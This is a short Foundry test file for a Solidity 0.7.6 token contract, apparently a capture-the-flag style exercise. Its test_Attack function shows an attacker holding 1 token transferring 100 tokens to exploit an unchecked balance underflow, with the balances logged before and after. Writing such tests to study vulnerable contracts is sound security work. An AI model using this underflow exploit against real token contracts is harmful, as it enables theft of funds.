// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;
pragma abicoder v2;

import {Test} from "forge-std/Test.sol";
import {Token} from "../../src/Token.sol";
import "forge-std/console.sol";

contract TokenTest is Test {
    Token public token;

    address _attacker = address(1);

    function setUp() public {
        token = new Token();
    }

    function test_Attack() public {
        token.transfer(_attacker, 1);

        uint256 attackerBalanceBefore = token.balances(_attacker);
        console.log("Attacker balance before: ", attackerBalanceBefore);

        vm.prank(_attacker);
        // vm.expectRevert("not enough balance");
        token.transfer(address(this), 100);

        uint256 attackerBalanceAfter = token.balances(_attacker);
        console.log("Attacker balance after: ", attackerBalanceAfter);
    }
}
